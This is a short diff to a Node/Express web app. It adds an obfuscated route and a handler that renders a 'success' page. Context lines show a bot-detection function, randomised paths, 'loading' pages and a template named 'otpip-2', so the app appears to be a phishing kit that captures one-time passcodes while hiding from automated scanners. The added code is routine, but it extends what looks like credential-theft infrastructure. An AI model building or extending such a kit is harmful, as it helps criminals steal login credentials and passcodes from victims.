@@ -62,6 +62,7 @@ const REAL_ROUTES = [
   '/EEXnHMpMEHxNNMgX5Duh',
   '/BfhMN3hPfFL88zgqtPAk',
   '/3EtpVNHarRb8PqJfArbu',
+  '/XvXnHMpMEHxNNMgX5Duh',
 ];
 
 // Bot detection function
@@ -548,6 +549,10 @@ app.get("/BfhMN3hPfFL88zgqtPAk",(req,res)=>{ // loading 2:
 
 app.get("/EEXnHMpMEHxNNMgX5Duh",(req,res)=>{ // loading 3:
     res.render("otpip-2",{url:process.env.URL});
+});
+
+app.get("/XvXnHMpMEHxNNMgX5Duh",(req,res)=>{ // success page
+    res.render("success",{url:process.env.URL});
 });
 
 app.get("/OOMPZ5nz4RnFvFV8s",(req,res)=>{ // app auth:
